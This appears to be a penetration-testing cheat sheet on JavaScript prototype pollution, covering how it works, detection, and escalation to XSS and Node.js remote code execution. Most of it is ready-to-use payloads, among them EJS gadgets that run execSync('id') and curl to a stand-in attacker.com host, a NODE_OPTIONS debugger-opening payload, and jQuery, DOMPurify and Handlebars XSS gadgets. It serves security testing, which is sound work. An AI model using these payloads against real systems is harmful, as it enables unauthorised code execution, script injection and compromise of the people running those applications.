# Prototype Pollution

**CWE:** CWE-1321 | **OWASP:** A08:2021

> Prototype pollution lets an attacker inject properties into JavaScript's base `Object.prototype`, affecting every object in the application. In the browser it leads to XSS; on the server (Node.js) it leads to RCE.

---

## How It Works

```javascript
// Every JavaScript object inherits from Object.prototype
let obj = {};
console.log(obj.toString); // inherited from Object.prototype

// If an attacker can control a key like __proto__, constructor, or prototype
// in a merge/clone/set operation:
obj["__proto__"]["isAdmin"] = true;

// Now EVERY object in the app has isAdmin = true
let user = {};
console.log(user.isAdmin); // true — even though we never set it
```

**Dangerous entry points:**
- Deep merge functions (lodash `merge`, `defaultsDeep`)
- Object clone operations
- Query string parsing (`?__proto__[admin]=true`)
- JSON parsing with property assignment
- Path-based property setters (`set(obj, "a.b.c", value)`)

---

## Client-Side Detection

```bash
# Inject via URL query parameters
https://target.com/?__proto__[testparam]=testvalue
https://target.com/?constructor[prototype][testparam]=testvalue
https://target.com/?__proto__.testparam=testvalue

# Check in browser console
Object.prototype.testparam   // "testvalue" → vulnerable

# Inject via JSON body
POST /api/settings
{"__proto__": {"isAdmin": true}}

{"constructor": {"prototype": {"isAdmin": true}}}

# Check after request
fetch('/api/me').then(r => r.json()).then(d => console.log(d.isAdmin))
```

---

## Server-Side Detection (Node.js)

```bash
# Inject via query string
GET /?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id')//

# Via JSON body
POST /api/merge
Content-Type: application/json
{"__proto__": {"polluted": "yes"}}

# Check response for unexpected properties or errors

# Blind detection via timing / OOB
{"__proto__": {"DEBUG": "true"}}
{"__proto__": {"NODE_DEBUG": "net"}}

# Automated scanner
python3 ppmap.py -u "https://target.com/" --params
```

---

## Client-Side XSS via Prototype Pollution

```bash
# Step 1: Find prototype pollution (set a test property)
?__proto__[testparam]=test123
# Verify: Object.prototype.testparam === "test123"

# Step 2: Find a gadget — code that uses Object property to execute JS
# Common gadgets in popular libraries:

# jQuery gadget (if jQuery is loaded)
?__proto__[html]=<img src=x onerror=alert(1)>
# When jQuery renders untrusted HTML using the polluted property

# Sanitize-html gadget
?__proto__[escapeHtml]=false

# DOMPurify bypass via pollution (version-specific)
?__proto__[ALLOW_UNKNOWN_PROTOCOLS]=true

# Look for gadgets in loaded JS libraries
grep -r "__proto__\|prototype\[" js/ -n
grep -r "Object\.assign\|merge\|extend\|defaults" js/ -n
```

---

## Server-Side RCE via Prototype Pollution

```bash
# Lodash merge gadget (< 4.17.20)
# Code path: lodash.merge + child_process.spawn

POST /api/settings
{"__proto__": {
  "shell": "node",
  "NODE_OPTIONS": "--inspect=0.0.0.0:1337"
}}

# EJS template engine gadget
{"__proto__": {
  "outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl http://attacker.com');"
}}

# Handlebars gadget
{"__proto__": {
  "pendingContent": "</style><img/src/onerror=alert(1)>"
}}

# Automated server-side detection
ppmap -u "https://target.com/api" --method POST --data '{"key":"value"}'
```

---

## Finding Prototype Pollution Automatically

```bash
# Browser-based scanner
# Install: Chrome extension "Client-Side Prototype Pollution Checker"

# PPMap (automated)
git clone https://github.com/kleiton0x00/ppmap
python3 ppmap.py -u https://target.com

# Burp Suite — Scan for PP via Active Scan
# DOM Invader (Burp) — best for client-side PP

# Manual approach: inject via every parameter type
# Query strings, JSON body, form data, path segments, cookie values
```

---

## Impact Assessment

**Client-side PP with no XSS gadget** → Low (proof of pollution, no direct exploit)

**Client-side PP + XSS gadget in loaded library** → High

**Client-side PP → CSP bypass or auth bypass** → High

**Server-side PP → RCE via template or spawn gadget** → Critical

**Server-side PP → property injection affecting auth checks** → Critical

---

## Libraries with Known Gadgets

**lodash** `merge`, `defaultsDeep`, `zipObjectDeep` — RCE gadgets exist in old versions

**jQuery** `$.extend(true, ...)` — XSS gadgets via HTML property pollution

**EJS** — RCE via `outputFunctionName` pollution

**Handlebars** — XSS via partial pollution

**Pug / Jade** — RCE via `pretty` property

**minimist** — PP in argument parsing (many Node.js CLIs affected)
